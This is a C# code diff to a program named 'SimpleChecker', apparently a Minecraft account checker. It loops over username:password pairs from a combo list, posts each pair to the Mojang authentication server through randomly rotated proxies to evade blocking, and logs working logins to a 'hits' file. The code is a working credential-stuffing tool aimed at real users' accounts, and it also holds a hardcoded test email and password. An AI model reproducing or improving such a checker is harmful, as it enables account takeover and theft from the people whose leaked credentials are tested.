@@ -10,34 +10,49 @@ namespace SimpleChecker
     public class Request
     {
         protected List<string> proxyList = new List<string>();
+        protected List<string> combos = new List<string>();
 
         public Request(List<string> proxies)
         {
             this.proxyList = proxies;
         }
-        public void GrabProxie()
+        public string GrabProxie()
         {
             Random r = new Random();
             int index = r.Next(0,proxyList.Count - 1); //keep it in bounds
             string myproxy = proxyList[index];
-            Post(myproxy);
+            return myproxy;
         }
-        public void Post(string proxy)
-        {
-            string name= "";
-            string pwd = "";
 
+        public void GrabUserandPassword()
+        //extract a line from the combos.txt
+        {
+            string line;
+            using(StreamReader sr = new StreamReader("combos.txt"))
+            {
+                while((line = sr.ReadLine()) != null)
+                {
+                    string[] proxyandport = GrabProxie().Split(":");
+                    string proxy = proxyandport[0];
+                    int port = int.Parse(proxyandport[1]);
+                    string[] combo = line.Split(":");
+                    Post(proxy, port,combo[0],combo[1]);
+                }
+            }
+        }
+        public void Post(string proxy, int port, string name, string pwd)
+        {
             try
             {
                 //open connection
                 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://authserver.mojang.com/authenticate");
                 request.Method = "POST";
-                // request.Proxy = new WebProxy(proxy, true); //connect through random proxy
-                // request.Timeout = 5; //set proxy alive time
+                request.Timeout = 50; //set proxy alive time
+                request.Proxy = new WebProxy(proxy,port); //connect through random proxy
 
                 //set payload
-                name = "mijaj50792@ualmail.com";
-                pwd = "Thisisatest"; //Thisisatest
+                // name = "mijaj50792@ualmail.com";
+                // pwd = "Thisisatest"; //Thisisatest
                 string json = "{\"agent\": {\"name\": \"Minecraft\",\"version\": 1},\"username\":\"" +name +"\",\"password\":\""+ pwd+"\",\"requestUser\": true}";
                 // turn our request string into a byte stream
                 byte[] postBytes = Encoding.UTF8.GetBytes(json);
@@ -57,7 +72,7 @@ namespace SimpleChecker
                     result = rdr.ReadToEnd();
                 }
                 Console.ForegroundColor  = ConsoleColor.Green;
-                Console.WriteLine("[Hit!]\t"+ proxy+"\t"+name+":"+pwd);
+                Console.WriteLine("[Hit!]\t\t"+ proxy+":"+port+"\t"+name+":"+pwd);
                 using(StreamWriter file = File.AppendText("hits.txt"))
                 {
                     file.WriteLine(name+":"+pwd); // apend to hits.txtt
@@ -69,14 +84,16 @@ namespace SimpleChecker
                 Console.ForegroundColor  = ConsoleColor.Red; // bad proxie (blanket banned)
                 if (e.ToString().Contains("timed out"))
                 {
+                    Console.WriteLine(e);
+                    Console.ReadKey();
                     Console.WriteLine("---[Proxy Timeout(5s)]---");
-                    Console.WriteLine("   "+proxy);
+                    Console.WriteLine("   "+proxy+":"+port);
                     int removal = proxyList.IndexOf(proxy);
                     proxyList.RemoveAt(removal);
                     Console.WriteLine("---[  Removed Proxy  ]---");
                 }else if(e.ToString().Contains("Forbidden")) // bad account
                 {
-                    Console.WriteLine("[Invalid!]\t" + proxy+"\t"+name+":"+pwd);
+                    Console.WriteLine("[Invalid!]\t" + proxy+":"+port+"\t"+name+":"+pwd);
                 }
             }
         }
